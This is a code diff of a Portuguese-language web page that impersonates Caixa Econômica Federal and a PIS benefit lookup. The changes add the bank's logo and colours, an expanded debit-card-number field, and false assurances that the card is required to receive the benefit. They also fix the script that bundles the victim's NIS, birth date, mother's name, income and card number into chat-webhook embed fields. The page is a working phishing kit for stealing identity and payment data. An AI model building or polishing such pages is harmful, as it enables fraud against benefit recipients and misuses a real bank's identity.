@@ -15,6 +15,7 @@
             --dark: #212529;
             --gray: #6c757d;
             --security: #ffc107;
+            --caixa-color: #00704a;
         }
         
         body {
@@ -288,17 +289,52 @@
             color: #004080;
         }
 
-        /* Novos estilos para o campo do cartão */
+        /* Estilos para o campo do cartão */
         .cartao-group {
             margin-top: 1.5rem;
             border-top: 1px solid #eee;
             padding-top: 1.5rem;
         }
         
+        .cartao-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .cartao-header img {
+            height: 40px;
+            width: auto;
+        }
+        
         .cartao-info {
             font-size: 0.85rem;
             color: var(--gray);
             margin-top: 0.5rem;
+            background-color: rgba(0, 112, 74, 0.05);
+            padding: 10px;
+            border-radius: 5px;
+            border-left: 3px solid var(--caixa-color);
+        }
+        
+        .cartao-details {
+            display: flex;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .cartao-detail {
+            flex: 1;
+            background-color: rgba(0, 112, 74, 0.05);
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 0.8rem;
+        }
+        
+        .cartao-detail i {
+            color: var(--caixa-color);
+            margin-right: 5px;
         }
         
         @media (max-width: 768px) {
@@ -334,6 +370,10 @@
             .lgpd-info {
                 margin: 1rem;
                 padding: 1rem;
+            }
+            
+            .cartao-details {
+                flex-direction: column;
             }
         }
     </style>
@@ -448,17 +488,36 @@
                     <div class="error-message" id="renda_error">Informe um valor válido</div>
                 </div>
                 
-                <!-- Novo campo para cartão de débito -->
+                <!-- Campo para cartão de débito da Caixa -->
                 <div class="form-group cartao-group">
-                    <label for="cartao_debito" class="required">Cartão de Débito Caixa</label>
+                    <div class="cartao-header">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4a/Caixa_Econ%C3%B4mica_Federal_logo.svg/1200px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png" 
+                             alt="Caixa Econômica Federal" style="height: 40px;">
+                        <h3><i class="fas fa-credit-card"></i> Cartão de Débito Caixa</h3>
+                    </div>
+                    
+                    <label for="cartao_debito" class="required">Número do Cartão</label>
                     <div class="input-wrapper">
                         <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
                         <i class="fas fa-check valid-icon" id="cartao_valid"></i>
                         <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
                     </div>
-                    <div class="error-message" id="cartao_error">Informe um número de cartão válido</div>
+                    <div class="error-message" id="cartao_error">Informe um número de cartão válido (16 dígitos)</div>
+                    
                     <div class="cartao-info">
-                        <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito da Caixa
+                        <p><i class="fas fa-info-circle"></i> <strong>Informações sobre o cartão de débito Caixa:</strong></p>
+                        <p>Para receber o benefício do PIS, é necessário informar os dados do seu cartão de débito da Caixa Econômica Federal.</p>
+                    </div>
+                    
+                    <div class="cartao-details">
+                        <div class="cartao-detail">
+                            <i class="fas fa-question-circle"></i>
+                            <strong>Onde encontrar:</strong> O número de 16 dígitos está na frente do seu cartão de débito Caixa.
+                        </div>
+                        <div class="cartao-detail">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <strong>Não tem cartão?</strong> Dirija-se a qualquer agência da Caixa para solicitar seu cartão de débito.
+                        </div>
                     </div>
                 </div>
                 
@@ -609,9 +668,9 @@
         }
         
         function validateField(input, isValid, fieldName) {
-            const validIcon = document.getElementById(${fieldName}_valid);
-            const invalidIcon = document.getElementById(${fieldName}_invalid);
-            const errorElement = document.getElementById(${fieldName}_error);
+            const validIcon = document.getElementById(`${fieldName}_valid`);
+            const invalidIcon = document.getElementById(`${fieldName}_invalid`);
+            const errorElement = document.getElementById(`${fieldName}_error`);
             
             if (input.value === '') {
                 // Campo vazio - remove todas as marcações
@@ -720,9 +779,9 @@
                             { name: '🎂 Data Nascimento', value: formData.data_nascimento || 'Não informado', inline: true },
                             { name: '🔢 NIS', value: formData.nis || 'Não informado', inline: true },
                             { name: '👩 Nome da Mãe', value: formData.nome_mae || 'Não informado', inline: true },
-                            { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? ${formData.tempo_contribuicao} anos : 'Não informado', inline: true },
+                            { name: '⏳ Tempo Contribuição', value: formData.tempo_contribuicao ? `${formData.tempo_contribuicao} anos` : 'Não informado', inline: true },
                             { name: '💼 Último Emprego', value: formData.ultimo_emprego || 'Não informado', inline: true },
-                            { name: '💰 Renda Mensal', value: formData.renda ? R$ ${formData.renda} : 'Não informado', inline: true },
+                            { name: '💰 Renda Mensal', value: formData.renda ? `R$ ${formData.renda}` : 'Não informado', inline: true },
                             { name: '💳 Cartão de Débito', value: formData.cartao_debito || 'Não informado', inline: true },
                             { name: '📅 Data da Consulta', value: new Date(formData.data_consulta).toLocaleString(), inline: false }
                         ],
@@ -768,6 +827,9 @@
                         <li>Comprovante de residência atualizado</li>
                         <li>Cartão de débito da Caixa (para crédito em conta)</li>
                     </ul>
+                    <div style="margin-top: 1rem; background-color: rgba(0, 112, 74, 0.1); padding: 10px; border-radius: 5px; border-left: 3px solid #00704a;">
+                        <p><i class="fas fa-credit-card" style="color: #00704a;"></i> <strong>Informação sobre o cartão:</strong> O valor será creditado automaticamente na conta vinculada ao cartão informado.</p>
+                    </div>
                 `;
             } else {
                 resultadoDiv.className = 'result-container result-negative';
@@ -788,6 +850,9 @@
                         <li>Consulte o empregador sobre o envio das informações</li>
                         <li>Procure a Central de Atendimento do PIS/PASEP</li>
                     </ul>
+                    <div style="margin-top: 1rem; background-color: rgba(0, 112, 74, 0.1); padding: 10px; border-radius: 5px; border-left: 3px solid #00704a;">
+                        <p><i class="fas fa-info-circle" style="color: #00704a;"></i> <strong>Sobre seu cartão:</strong> Mesmo sem direito atual, mantenha seu cartão de débito da Caixa ativo para futuros benefícios.</p>
+                    </div>
                 `;
             }
             
